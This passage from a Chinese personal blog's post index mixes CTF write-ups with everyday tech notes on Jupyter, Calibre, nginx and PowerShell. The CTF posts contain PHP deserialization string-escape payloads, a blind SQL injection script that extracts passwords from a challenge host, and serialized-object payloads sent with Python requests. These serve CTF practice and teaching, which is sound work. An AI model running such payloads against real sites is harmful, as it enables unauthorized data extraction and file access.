class="line-numbers-rows"><span></span></span></code></pre><h3 id="反序列化字符串逃逸"><a href="#反序列化字符串逃逸" class="headerlink" title="反序列化字符串逃逸"></a>反序列化字符串逃逸</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token string single-quoted-string">'a:2:&#123;i:0;s:8:"Hed9eh0g";i:1;s:5:"aaaaa";&#125;abc'</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>仍然可以输出上面的结果，这说明反序列化的过程是有一定识别范围的，在这个范围之外的字符(第二个例子里的abc)都会被忽略，不影响反序列化的正常进行。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'flagflagflagflagflagflag'</span>；<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"function"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";&#125;'</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"img"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'L2QwZzNfZmxsbGxsbGFn'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>a:3:&#123;s:4:"user";s:24:"flagflagflagflagflagflag";s:8:"function";s:59:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";&#125;";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>假设后台存在一个过滤机制，会将含flag字符替换为空，那么以上序列化字符串过滤结果为</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">24</span><span class="token punctuation">:</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"function"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">59</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"ZDBnM19mMWFnLnBocA=="</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"dd"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token string double-quoted-string">";s:3:"</span>img<span class="token string double-quoted-string">";s:20:"</span>L2QwZzNfZmxsbGxsbGFn"<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第二个s所对应的数字，本来由于有6个flag字符所以为24，现在这6个flag都被过滤了，那么它将会尝试向后读取24个字符看看是否满足序列化的规则，<br>也即读取;s:8:”function”;s:59:”a,读取这24个字符后以”;结尾，恰好满足规则，而后第三个s向后读取img的20个字符，第四个、第五个s向后读取均满足规则，所以序列化结果为：</p><pre class="line-numbers language-none"><code class="language-none">array(3) &#123;[&quot;user&quot;]&#x3D;&gt; string(24) &quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;[&quot;img&quot;]&#x3D;&gt; string(20) &quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;[&quot;dd&quot;]&#x3D;&gt; string(1) &quot;a&quot;&#125;$_SESSION[&quot;user&quot;]&#x3D;&#39;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&#39;;$_SESSION[&quot;img&quot;]&#x3D;&#39;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&#39;;$_SESSION[&quot;dd&quot;]&#x3D;&#39;a&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>综上，payload如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token comment">#方法一</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flagflag'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'";s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;'</span><span class="token punctuation">;</span>    <span class="token comment">#结果 a:1:&#123;s:8:"flagflag";s:51:"";s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;";&#125;，这里就造成img不成为一个键，也就无法进行加密</span>    <span class="token comment">#过滤掉flag有</span>    <span class="token comment">#a:1:&#123;s:8:"";s:51:"";s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;";&#125;</span>    <span class="token comment"># ";s:51:"变成字符串值，这时img成功逃逸出来</span>​    <span class="token comment">#方法二</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flagphp'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">';s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;'</span><span class="token punctuation">;</span>    <span class="token comment">#方法三</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flagflag'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'";s:2:"aa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;'</span><span class="token punctuation">;</span>​<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[BJDCTF 2nd]简单注入</title>
      <link href="/p/1156766915.html"/>
      <url>/p/1156766915.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>以前做的题</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-BJDCTF-2nd-%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5/image-20210720190936565.png" alt="image-20210720190936565"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-BJDCTF-2nd-%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5/image-20210720190939695.png" alt="image-20210720190939695"></p><pre class="line-numbers language-none"><code class="language-none">select * from users where username&#x3D;&#39;$_POST[&quot;username&quot;]&#39; and password&#x3D;&#39;$_POST[&quot;password&quot;]&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">传入admin\和or&#x2F;**&#x2F;length(database())&gt;0#会回显stronger字样传入admin\和or&#x2F;**&#x2F;length(database())&lt;0#会回显girl friend字样<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://0f34fb9a-d697-428e-8383-5e31b7f7cdd0.node3.buuoj.cn/index.php"</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"admin\\"</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">&#125;</span> <span class="token comment"># python 这里也要转义</span>result <span class="token operator">=</span> <span class="token string">""</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>head <span class="token operator">&lt;</span> tail<span class="token punctuation">)</span><span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># payload = "or/**/if(ascii(substr(username,%d,1))>%d,1,0)#"%(i,mid)</span>        payload <span class="token operator">=</span> <span class="token string">"or/**/if(ascii(substr(password,%d,1))>%d,1,0)#"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> mid<span class="token punctuation">)</span>        data<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">=</span> payload        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"stronger"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tail <span class="token operator">=</span> mid    last <span class="token operator">=</span> result    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>protected/private反序列化中python发包注意点</title>
      <link href="/p/2019161034.html"/>
      <url>/p/2019161034.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天做了道反序列的题，<code>[网鼎杯 2020 青龙组]AreUSerialz</code><br>反序列题一直都不太会做，这道题其中也有诸多疑问，于是搭建了个环境认真研究了下</p><p>原题的wp中主要注意的一点就是php7.1+版本对属性类型不明感，可转化为public绕过</p><h2 id="改动"><a href="#改动" class="headerlink" title="改动"></a>改动</h2><p>然后我把题目改了下，把<code>function is_valid($s)&#123;&#125;</code>删掉，目的是想研究下protected变量的反序列化问题。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FileHandler</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"../../../WWW/localhost/flag.php"</span><span class="token punctuation">;</span>     <span class="token comment">//这里那么长是因为反序列后路径变到php.exe那里，需要改下目录或者干脆绝对路径</span><span class="token punctuation">&#125;</span><span class="token variable">$A</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$B</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$A</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$B</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>浏览器刷新下，复制下来</p><pre class="line-numbers language-none"><code class="language-none">O:11:&quot;FileHandler&quot;:2:&#123;s:5:&quot;*op&quot;;i:2;s:11:&quot;*filename&quot;;s:31:&quot;..&#x2F;..&#x2F;..&#x2F;WWW&#x2F;localhost&#x2F;flag.php&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意s:5:”*op”，实际上是有一个ascii码为0的不可见字符在里面，所以长度是5不是2。</p><p>如果长度错误反序列化就是失败。</p><p>所以如果是这两个变量的话需要手动改成以下这样的形式。</p><p>private：</p><pre class="line-numbers language-none"><code class="language-none">\x00类名\x00变量名\0类名\0变量名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>protected：</p><pre class="line-numbers language-none"><code class="language-none">\x00*\x00变量名\0*\0变量名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后要注意的是因为url解码会把这些字符转化掉，经测试谷歌浏览器和burpsuite都没办法正确传值，所以要用python发包</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//?str=\0*\0</span><span class="token keyword">echo</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 什么都没有</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// \0*\0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>python发包代码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://localhost/test2.php/?str=O:11:"FileHandler":2:&#123;s:5:"\0*\0op";i:2;s:11:"\0*\0filename";s:31:"../../../WWW/localhost/flag.php";&#125;'</span>payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这里又掉入了一个坑，平时写字符串都喜欢加个r，写什么是什么不让它自动转义，</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">url <span class="token operator">=</span> <span class="token string">r'http://localhost/test2.php/?str=O:11:"FileHandler":2:&#123;s:5:"\0*\0op";i:2;s:11:"\0*\0filename";s:31:"../../../WWW/localhost/flag.php";&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这次我加了r，实际是多次一举。</p><p>写<code>\x00*\x00</code>或<code>\0*\0</code>本意就是让它在发包的时候自动转义，加了r反而把16进制当做字符串传过去，导致反序列化失败。</p><h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><p>为什么删掉原代码中的<code>$str = (string)$_GET[&#39;str&#39;];</code>，反序列化会失败？</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> requests </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jupyter Notebook 右键直接打开一事</title>
      <link href="/p/257582186.html"/>
      <url>/p/257582186.html</url>
      
        <content type="html"><![CDATA[<p>每次打开项目，都得点击开始菜单-找到快捷方式，然后把文件扔进去，太烦了太烦了</p><p>然后开始百度有没有什么右键直接打开的办法，折腾一两个小时无果，还以为自己环境有问题重装三四回</p><p>之后自己仔细想了想，有个十分简单的解决办法</p><p>首先找到你常打开的Jupyter Notebook(官方说明上是推荐点击用这个快捷方式</p><p><img src="/../images/jupyter/1.png"></p><p>右键-属性</p><p>找到目标，将改栏复制出来，比如我的长这样</p><pre class="line-numbers language-none"><code class="language-none">D:\Anaconda3\python.exe D:\Anaconda3\cwp.py D:\Anaconda3 D:\Anaconda3\python.exe D:\Anaconda3\Scripts\jupyter-notebook-script.py &quot;%USERPROFILE%&#x2F;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>把最后面的</p><pre class="line-numbers language-none"><code class="language-none">&quot;%USERPROFILE%&#x2F;&quot; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>替换为</p><pre class="line-numbers language-none"><code class="language-none">&quot;%V&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>记得有空格</p><p>在这忍不住想吐槽下，网上各种文章不动脑子的抄抄抄，我折腾半天都不行，结果发现中间要加空格，恶心坏了。</p><p>然后整个reg文件</p><pre class="line-numbers language-none"><code class="language-none">Windows Registry Editor Version 5.00[HKEY_CLASSES_ROOT\Directory\Background\shell\Open Jupyter]@&#x3D;&quot;Open with Jupyter Notebook&quot;&quot;Icon&quot;&#x3D;&quot;D:\\Anaconda3\\Menu\\jupyter.ico&quot;[HKEY_CLASSES_ROOT\Directory\Background\shell\Open Jupyter\command]@&#x3D;&quot;这里替换之前整的路径&quot;[HKEY_CLASSES_ROOT\Directory\shell\Open Jupyter]@&#x3D;&quot;Open with Jupyter Notebook&quot;&quot;Icon&quot;&#x3D;&quot;D:\\Anaconda3\\Menu\\jupyter.ico&quot;[HKEY_CLASSES_ROOT\Directory\shell\Open Jupyter\command]@&#x3D;&quot;这里替换之前整的路径&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行下完事</p><p>问题就是只能这么运行一次，再想想有没有其他办法。</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 坑 </tag>
            
            <tag> Jupyter Notebook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Calibre - 轻小说、漫画上佳阅读器</title>
      <link href="/p/1395865045.html"/>
      <url>/p/1395865045.html</url>
      
        <content type="html"><![CDATA[<h2 id="概括"><a href="#概括" class="headerlink" title="概括"></a>概括</h2><p>免费无广告，官方中文，上佳WIN/MAC/LINUX端阅读器/编辑器，适合轻小说，漫画爱好者，kindle用户。<br>支持格式：EPUB、MOBI、TXT、PDF、ZIP、RTF、AZW3、DOCX、FB2、HTMLZ、LIT、LRF、PDB、PMLZ、RB、RTF、SNB、TCR、TXTZ</p><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>前些天想看看看看漫画培养一下少女心，因为找到的漫画资源是epub格式的，所以苦寻PC上epub阅读器。<br>试用了<strong>readium</strong>作者的桌面版产品<strong>Thorium</strong>，结果不尽人意，后来又试了下微软商店里的<strong>干净阅读</strong>，感觉差了点什么。<br>最后在知乎发现了这款软件<br>上手把玩了下，一种如获至宝的喜悦感油然而生，对开发者的匠心赞叹不已。从软件中能明显感觉到开发者那种仔细打磨，我也很奇怪，反正就是这种突如其来的感觉。<br>面对这款软件，真的满满的幸福感。正好心血来潮，写篇文章记录一下</p><p>作者简介啥的就不说了，捐赠的时候看作者的照片有点像印度人？</p><h2 id="界面展示"><a href="#界面展示" class="headerlink" title="界面展示"></a>界面展示</h2><h3 id="清爽的界面"><a href="#清爽的界面" class="headerlink" title="清爽的界面"></a>清爽的界面</h3><p><img src="/../images/calibre/1.jpg" alt="img"></p><h3 id="可切换布局"><a href="#可切换布局" class="headerlink" title="可切换布局"></a>可切换布局</h3><p><img src="/../images/calibre/2.jpg" alt="img"></p><h3 id="多样化设置"><a href="#多样化设置" class="headerlink" title="多样化设置"></a>多样化设置</h3><p>可改<strong>图标、界面字体、文本字体</strong><br><img src="/../images/calibre/3.jpg" alt="img"><br><img src="/../images/calibre/4.jpg" alt="img"></p><h3 id="在线搜书、新闻抓取-自定义RSS源"><a href="#在线搜书、新闻抓取-自定义RSS源" class="headerlink" title="在线搜书、新闻抓取 自定义RSS源"></a>在线搜书、新闻抓取 自定义RSS源</h3><p><img src="/../images/calibre/5.jpg" alt="img"><br><img src="/../images/calibre/6.jpg" alt="img"></p><h3 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h3><p><img src="/../images/calibre/7.jpg" alt="img"></p><hr><p>里面能定制化的地方真的很多，功能丰富但不臃肿，还有文本编辑功能，可以拿来做epub之类的。虽然绝大部分功能我也只是看看用不来，但这软件并没有给我一种专业人士使用的感觉，而是十分的平易近人。</p><h2 id="更改文本字体演示"><a href="#更改文本字体演示" class="headerlink" title="更改文本字体演示"></a>更改文本字体演示</h2><p><img src="/../images/calibre/8.jpg" alt="img"><br><img src="/../images/calibre/9.jpg" alt="img"></p><p>然后转换一下，会生成新的内嵌字体的文本，原来的文本还是在的<br><img src="/../images/calibre/10.jpg" alt="img"></p><p><img src="/../images/calibre/11.jpg" alt="img"></p><p>注释功能也有<br><img src="/../images/calibre/12.jpg" alt="img"></p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>真的很强大，更多功能也在挖掘中，慢慢更新。</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Calibre </tag>
            
            <tag> epub </tag>
            
            <tag> 阅读器 </tag>
            
            <tag> 软件推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nginx初步搭建二三事</title>
      <link href="/p/777074487.html"/>
      <url>/p/777074487.html</url>
      
        <content type="html"><![CDATA[<h2 id="nginx注意事项"><a href="#nginx注意事项" class="headerlink" title="nginx注意事项"></a>nginx注意事项</h2><p>一直以来都是用宝塔建站，今天特殊情况，需要单独装个nginx用。<br>环境：Ubuntu16.06<br>首先安装nginx，直接apt装的是低版本，所以</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">wget http:&#x2F;&#x2F;nginx.org&#x2F;keys&#x2F;nginx_signing.keyapt-key add nginx_signing.keyecho -e &quot;deb http:&#x2F;&#x2F;nginx.org&#x2F;packages&#x2F;ubuntu&#x2F; xenial nginx&quot; &gt;&gt; &#x2F;etc&#x2F;apt&#x2F;sources.listecho -e &quot;deb-src http:&#x2F;&#x2F;nginx.org&#x2F;packages&#x2F;ubuntu&#x2F; xenial nginx&quot; &gt;&gt; &#x2F;etc&#x2F;apt&#x2F;sources.listapt updateapt install nginx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样就是当前最新稳定版的了。<br>然后坑就开始了。<br>百度半天nginx搭建web教程(大多文章都你抄我我抄你，也是醉了)<br>怎么搞都不行，折腾几个小时烦死了。</p><p>写的比较标准的方法都是在 <strong>sites-available</strong> 里创建配置然后软链接到 <strong>sites-enabled</strong><br>没错，但我主要强调一点，也就是被坑的地方<br>注意要在 <strong>/etc/nginx/nginx.conf</strong> 里加入 <code>include /etc/nginx/sites-enabled/*;</code></p><blockquote><p>conf.d：用户自己定义的conf配置文件<br>sites-available：系统默认设置的配置文件<br>sites-enabled：由sites-available中的配置文件转换生成<br>nginx.conf：汇总以上三个配置文件的内容，同时配置我们所需要的参数</p></blockquote><p>所以有两种办法</p><ul><li>直接在<strong>conf.d/</strong> 下创建<strong>domain.com.conf</strong></li><li>在<strong>sites-available</strong> 下创建<strong>domain.com</strong> 然后<code>ln -s /etc/nginx/sites-available/excalibur.moe /etc/nginx/sites-enabled/</code>软连接过去</li></ul><p><strong>nginx.conf</strong> 文件中，谁的include在上面谁的优先级就高</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">service  nginx reloadservice  nginx startservice  nginx stopservice  nginx restart<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 坑 </tag>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Install-Module 找不到与参数名称Scope匹配的参数</title>
      <link href="/p/528086098.html"/>
      <url>/p/528086098.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://i.loli.net/2019/12/01/HtCcs9mBKgxGNXO.png"><br>使用 Install-Module posh-git 时报错，提示找不到与参数名称Scope匹配的参数。<br>谷歌一个多小时，发现没有相关解。怀疑人生<br>仔细一看代码才发现，提示psgetXXXXXX<br>想想应该是之前不规范配置powershell遗留下来的东西<br>管理员运行powershell 输入</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>清空 ~\WindowsPowerShell 文档下的 Microsoft.PowerShell_profile 配置文件。<br>删除 ~\WindowsPowerShell\Modules 文档下的 psget和posh-git (反正就是清理干净)<br>重新Install-Module posh-git<br>成功，结束。<br>附两篇美化指南：<br><a href="https://zhuanlan.zhihu.com/p/51901035">https://zhuanlan.zhihu.com/p/51901035</a><br><a href="https://nexmoe.com/1519803391.html">https://nexmoe.com/1519803391.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 坑 </tag>
            
            <tag> Powershell </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
